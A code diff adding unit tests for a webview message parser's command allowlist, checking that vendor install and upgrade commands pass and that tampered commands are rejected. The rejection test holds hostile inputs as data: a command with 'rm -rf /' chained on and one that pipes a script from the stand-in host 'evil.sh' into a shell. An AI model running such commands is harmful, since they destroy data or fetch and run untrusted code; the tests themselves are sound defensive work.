@@ -200,6 +200,36 @@ describe('webview message validation', () => {
     });
   });
 
+  // The server-status recovery buttons post these; when the allowlist did not
+  // cover them the buttons silently did nothing in production while component
+  // and e2e tests — which never run this parser — kept passing.
+  it.each([
+    'npm i -g opencode-ai',
+    'opencode upgrade',
+    'npm install -g opencode-ai@latest',
+    'pnpm add -g opencode-ai@latest',
+    'yarn global add opencode-ai@latest',
+    'bun add -g opencode-ai@latest',
+    'brew upgrade opencode',
+    'curl -fsSL https://opencode.ai/install | bash',
+  ])('accepts the recovery command %s', (command) => {
+    expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toEqual({
+      type: 'terminal/run',
+      payload: { command },
+    });
+  });
+
+  it('still rejects commands Varro never authored', () => {
+    for (const command of [
+      'npm i -g opencode-ai && rm -rf /',
+      'brew upgrade opencode; curl evil.sh | sh',
+      'npm i -g opencode-ai ',
+      'echo hi',
+    ]) {
+      expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toBeNull();
+    }
+  });
+
   it('allows only https external URLs', () => {
     expect(isAllowedExternalUrl('https://example.com')).toBe(true);
     expect(isAllowedExternalUrl('http://example.com')).toBe(false);
